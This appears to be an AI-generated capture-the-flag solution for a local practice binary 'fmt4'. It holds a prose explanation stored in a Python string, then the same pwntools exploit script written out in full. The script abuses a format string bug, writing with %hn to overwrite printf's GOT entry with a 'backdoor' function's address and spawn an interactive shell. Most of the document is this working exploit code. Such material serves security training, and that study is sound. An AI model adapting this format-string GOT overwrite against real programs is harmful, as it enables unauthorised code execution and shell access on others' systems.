('To solve this challenge, we will exploit a format string vulnerability to '
 'overwrite the Global Offset Table (GOT) entry for `printf` with the address '
 'of the `backdoor` function. Since the binary provides us with the address of '
 "`backdoor` and isn't compiled with position-independent execution (PIE), we "
 "can reliably calculate addresses. We'll construct a format string that "
 'writes the desired address to the GOT entry, leading to execution of '
 '`backdoor` and spawning a shell.\n'
 '\n'
 'Here are the necessary imports:\n'
 '\n'
 '```python\n'
 'from pwn import *\n'
 '```\n'
 '\n'
 "And here's the exploit code:\n"
 '\n'
 '```python\n'
 'from pwn import *\n'
 '\n'
 '# Start the process\n'
 "io = process('./fmt4')\n"
 '\n'
 "# Read the line containing the 'gift' address\n"
 'line = io.recvline()\n'
 'print(line.decode())\n'
 '\n'
 "# Extract the address of 'backdoor' from the 'gift' line\n"
 'backdoor_line = line.decode()\n'
 "address_str = backdoor_line.strip().split(' ')[1]\n"
 'backdoor_addr = int(address_str, 16)\n'
 'print(f"Backdoor address: {hex(backdoor_addr)}")\n'
 '\n'
 "# Address of 'printf' in the GOT\n"
 'printf_got = 0x0804a010  # From the provided GOT information\n'
 '\n'
 "# Split the 'backdoor' address into lower and higher 2 bytes\n"
 'backdoor_addr_low = backdoor_addr & 0xffff\n'
 'backdoor_addr_high = (backdoor_addr >> 16) & 0xffff\n'
 '\n'
 '# Decide the order of writing to avoid negative padding\n'
 'if backdoor_addr_low > backdoor_addr_high:\n'
 '    first_value = backdoor_addr_high\n'
 '    second_value = backdoor_addr_low\n'
 '    first_addr = printf_got + 2\n'
 '    second_addr = printf_got\n'
 'else:\n'
 '    first_value = backdoor_addr_low\n'
 '    second_value = backdoor_addr_high\n'
 '    first_addr = printf_got\n'
 '    second_addr = printf_got + 2\n'
 '\n'
 '# Create the payload with addresses\n'
 'payload = p32(first_addr)\n'
 'payload += p32(second_addr)\n'
 '\n'
 '# Calculate the padding needed after considering the bytes already written\n'
 'offset = 9  # The offset where our addresses are located on the stack\n'
 'written = len(payload)  # Bytes already written\n'
 '\n'
 '# Calculate padding for the first write\n'
 'padding1 = (first_value - written) % 0x10000\n'
 'if padding1 < 10:\n'
 '    padding1 += 0x10000  # Ensure sufficient padding to prevent format '
 'string issues\n'
 'written += padding1  # Update the total bytes written\n'
 '\n'
 '# Calculate padding for the second write\n'
 'padding2 = (second_value - written) % 0x10000\n'
 'if padding2 < 10:\n'
 '    padding2 += 0x10000  # Ensure sufficient padding\n'
 'written += padding2  # Update total bytes written\n'
 '\n'
 '# Construct the format string to write the values to the calculated '
 'addresses\n'
 "payload += f'%{padding1}c%{offset}$hn'.encode()\n"
 "payload += f'%{padding2}c%{offset + 1}$hn'.encode()\n"
 '\n'
 '# Send the payload to the process\n'
 'io.sendline(payload)\n'
 '\n'
 '# Interact with the spawned shell\n'
 'io.interactive()\n'
 '```\n'
 '\n'
 '**Explanation:**\n'
 '\n'
 '1. **Extracting the Backdoor Address:**\n'
 '   - The program displays a "gift" line that includes the address of the '
 '`backdoor` function. We read this line and parse out the address.\n'
 '\n'
 '2. **Preparing Addresses:**\n'
 '   - We need to overwrite the GOT entry for `printf`, located at '
 '`0x0804a010`.\n'
 "   - Since we're writing 4 bytes and can only write 2 bytes at a time with "
 '`%hn`, we split the address of `backdoor` into two halves: lower 2 bytes and '
 'higher 2 bytes.\n'
 '\n'
 '3. **Constructing the Payload:**\n'
 '   - We place the addresses (`first_addr` and `second_addr`) at the '
 'beginning of our payload.\n'
 '   - We calculate the necessary padding to ensure that when the format '
 'string writes, it writes the correct values.\n'
 '   - The `%hn` format specifier writes a 2-byte value to the address on the '
 'stack.\n'
 '   - The offsets (`%9$hn` and `%10$hn`) correspond to the positions of our '
 'addresses on the stack due to how `printf` interprets the format string.\n'
 '\n'
 '4. **Executing the Exploit:**\n'
 '   - We send the constructed payload to the process.\n'
 '   - Upon execution, the format string overwrites the GOT entry for `printf` '
 'with the address of `backdoor`.\n'
 '   - The next time `printf` is called (immediately after our input), it '
 'actually calls `backdoor`, spawning a shell.\n'
 '   - We interact with the shell using `io.interactive()`.\n'
 '\n'
 "**Note:** This exploit assumes that the addresses we've calculated "
 'correspond accurately to their positions on the stack, which may vary '
 'depending on the environment. If the offsets are incorrect, you might need '
 'to adjust the `offset` variable used in the format string.')

from pwn import *

# Set the logging level to 'debug' for detailed output (optional)
context.log_level = 'debug'

# Start the process
io = process('./fmt4')

# Read the line containing the 'gift' address and extract the backdoor address
line = io.recvline()
print(line.decode())

# Extract the address of 'backdoor' from the 'gift' line
backdoor_line = line.decode()
address_str = backdoor_line.strip().split(' ')[1]
backdoor_addr = int(address_str, 16)
print(f"Backdoor address: {hex(backdoor_addr)}")

# Address of 'printf' in the GOT
printf_got = 0x0804a010  # From the provided GOT information

# Split the 'backdoor' address into lower and higher 2 bytes
backdoor_addr_low = backdoor_addr & 0xffff
backdoor_addr_high = (backdoor_addr >> 16) & 0xffff

# Decide the order of writing to avoid negative padding
if backdoor_addr_low > backdoor_addr_high:
    first_value = backdoor_addr_high
    second_value = backdoor_addr_low
    first_addr = printf_got + 2
    second_addr = printf_got
else:
    first_value = backdoor_addr_low
    second_value = backdoor_addr_high
    first_addr = printf_got
    second_addr = printf_got + 2

# Create the payload with addresses
payload = p32(first_addr)
payload += p32(second_addr)

# Calculate the padding needed after considering the bytes already written
offset = 9  # The offset where our addresses are located on the stack
written = len(payload)  # Bytes already written

# Calculate padding for the first write
padding1 = (first_value - written) % 0x10000
if padding1 < 10:
    padding1 += 0x10000  # Ensure sufficient padding to prevent format string issues
written += padding1  # Update the total bytes written

# Calculate padding for the second write
padding2 = (second_value - written) % 0x10000
if padding2 < 10:
    padding2 += 0x10000  # Ensure sufficient padding
written += padding2  # Update total bytes written

# Construct the format string to write the values to the calculated addresses
payload += f'%{padding1}c%{offset}$hn'.encode()
payload += f'%{padding2}c%{offset + 1}$hn'.encode()

# Send the payload to the process
io.sendline(payload)

# Interact with the spawned shell
io.interactive()